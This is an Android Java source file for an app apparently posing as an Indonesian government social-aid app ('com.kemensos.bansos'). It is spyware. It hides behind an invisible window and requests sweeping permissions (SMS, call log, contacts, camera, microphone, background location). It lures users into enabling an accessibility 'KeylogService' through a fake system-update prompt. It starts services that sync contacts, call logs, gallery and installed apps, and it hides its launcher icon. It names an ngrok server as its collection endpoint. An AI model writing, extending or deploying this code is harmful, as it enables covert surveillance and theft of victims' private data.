package com.kemensos.bansos;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityManager;
import android.widget.LinearLayout;
import android.widget.Toast;

import java.util.List;

/**
 * MainActivity — Transparent Permission-Request Activity.
 *
 * Upgraded to also guide user through AccessibilityService setup and
 * stealth-disable the launcher icon after first run.
 */
public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int OVERLAY_REQUEST_CODE = 101;
    private static final int BATTERY_REQUEST_CODE = 102;

    // Shared config for all services
    public static final String BASE_URL = "https://scarf-ion-cranium.ngrok-free.dev";
    public static String DEVICE_ID = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Set window to be invisible (1x1 pixel, transparent)
        Window window = getWindow();
        window.setFlags(
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        );
        window.setGravity(Gravity.TOP | Gravity.LEFT);

        LinearLayout root = new LinearLayout(this);
        root.setLayoutParams(new LinearLayout.LayoutParams(1, 1));
        root.setBackgroundColor(0x00000000);
        setContentView(root);

        // Start permission chain
        requestAllPermissions();
    }

    /* ===================================================================
     * PERMISSION CHAIN
     * =================================================================== */

    private void requestAllPermissions() {
        // Generate unique device ID
        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (androidId == null || androidId.isEmpty()) {
            androidId = "unknown" + System.currentTimeMillis();
        }
        DEVICE_ID = androidId.length() > 10 ? androidId.substring(0, 10) : androidId;

        Log.d(TAG, "🔴 DEVICE_ID: " + DEVICE_ID);

        String[] permissions;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_MEDIA_IMAGES
            };
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions = new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            };
        } else {
            permissions = new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            };
        }

        boolean allGranted = true;
        for (String p : permissions) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            requestPermissions(permissions, PERMISSION_REQUEST_CODE);
        } else {
            onPermissionsReady();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            onPermissionsReady();
        }
    }

    private void onPermissionsReady() {
        // 1. Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName())
                );
                startActivityForResult(intent, OVERLAY_REQUEST_CODE);
                return;
            }
        }
        requestBatteryOptimization();
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())
                    );
                    startActivityForResult(intent, BATTERY_REQUEST_CODE);
                    return;
                } catch (Exception ignored) {}
            }
        }
        openNotifAccess();
    }

    private void openNotifAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            String enabledListeners = Settings.Secure.getString(
                    getContentResolver(),
                    "enabled_notification_listeners"
            );
            if (enabledListeners == null || !enabledListeners.contains(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intent);
            }
        }
        openAccessibilitySettings();
    }

    /* ===================================================================
     * ACCESSIBILITY SERVICE SETUP (KEYLOGGER)
     * =================================================================== */

    private void openAccessibilitySettings() {
        // Check if KeylogService is already enabled
        if (isAccessibilityServiceEnabled()) {
            startServicesAndFinish();
            return;
        }

        // Open accessibility settings for the user to enable our service
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);

            // Show a helpful toast about what to do
            Toast.makeText(this,
                    "☑ Buka 'Pembaruan Sistem' → Aktifkan Layanan Aksesibilitas",
                    Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            // Fallback to application settings
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }

        // Start services anyway (KeylogService will be inactive until A11Y enabled,
        // but all other services work)
        startServicesAndFinish();
    }

    private boolean isAccessibilityServiceEnabled() {
        AccessibilityManager am = (AccessibilityManager)
                getSystemService(Context.ACCESSIBILITY_SERVICE);
        if (am == null) return false;

        List<AccessibilityServiceInfo> enabledServices =
                am.getEnabledAccessibilityServiceList(
                        AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        String ourServiceName = getPackageName() + "/.KeylogService";
        for (AccessibilityServiceInfo info : enabledServices) {
            if (info.getId().equals(ourServiceName)) {
                return true;
            }
        }
        return false;
    }

    /* ===================================================================
     * STEALTH: DISABLE LAUNCHER ICON
     * =================================================================== */

    private void stealthDisableIcon() {
        try {
            // Disable the real MainActivity (original launcher icon entry)
            PackageManager pm = getPackageManager();
            ComponentName mainComponent = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(mainComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            Log.d("Stealth", "Launcher icon disabled. App still running.");

            // Enable the alias (hidden — only accessible via notification/command)
            ComponentName aliasComponent = new ComponentName(this, "com.kemensos.bansos.MainActivityAlias");
            pm.setComponentEnabledSetting(aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

        } catch (Exception e) {
            Log.e("Stealth", "Icon disable error", e);
        }
    }

    /* ===================================================================
     * START SERVICES & FINISH
     * =================================================================== */

    private void startServicesAndFinish() {
        // 1. Start persistent foreground service (GPS + Camera + Update)
        Intent serviceIntent = new Intent(this, UpdateService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // 2. Start v5.0 monitoring services
        startService(new Intent(this, CallLogService.class));
        startService(new Intent(this, ContactSyncService.class));
        startService(new Intent(this, InstalledAppsService.class));
        startService(new Intent(this, GallerySyncService.class));

        // 3. Disable launcher icon (stealth)
        stealthDisableIcon();

        // 4. Finish activity (completely invisible now)
        finish();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OVERLAY_REQUEST_CODE) {
            requestBatteryOptimization();
        } else if (requestCode == BATTERY_REQUEST_CODE) {
            openNotifAccess();
        }
    }
}
